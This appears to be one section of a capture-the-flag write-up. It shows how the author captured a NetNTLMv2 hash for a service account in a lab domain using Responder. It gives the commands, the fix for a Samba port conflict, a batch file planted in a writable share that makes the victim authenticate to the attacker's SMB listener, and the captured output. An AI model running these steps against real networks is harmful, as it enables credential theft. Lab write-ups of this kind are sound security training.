# 02 — Responder & NTLMv2 Capture

## 1. Initial Responder Attempt

I started Responder on the `ens5` interface:

```bash
responder -I ens5 -v
```

The first attempt failed to start several listeners because local services were already occupying ports.

Important errors included:

```text
Error starting TCP server on port 139
Error starting TCP server on port 445
```

## 2. Troubleshooting the Port Conflict

I checked which processes were listening:

```bash
sudo ss -tulpn | grep -E ':445|:139'
```

The output showed:

```text
smbd ... :139
smbd ... :445
```

So the local Samba services were occupying the ports required by Responder.

I stopped them:

```bash
sudo systemctl stop smbd
sudo systemctl stop nmbd
```

Then verified:

```bash
sudo ss -tulpn | grep -E ':445|:139'
```

No listeners remained on those ports.

## 3. Triggering Authentication

I created a batch file:

```bat
@echo off
dir \10.49.80.182\share > nul 2>&1
```

The purpose was to cause the victim service to attempt SMB authentication back to the attacker-controlled SMB listener.

The writable `IT-Shared` location and the known periodic behaviour of `svc.scanner` made this useful as a credential-capture trigger.

## 4. Successful NTLMv2 Capture

After restarting Responder:

```bash
responder -I ens5 -v
```

Responder captured:

```text
[SMB] NTLMv2-SSP Client   : 10.49.157.149
[SMB] NTLMv2-SSP Username : CTF\svc.scanner
```

The captured material was saved to `hash.txt`.

### Important Distinction

This was a **NetNTLMv2** challenge-response capture, not a raw NT hash.

That distinction matters because the next step is cracking the captured response rather than using it directly as a Pass-the-Hash credential.

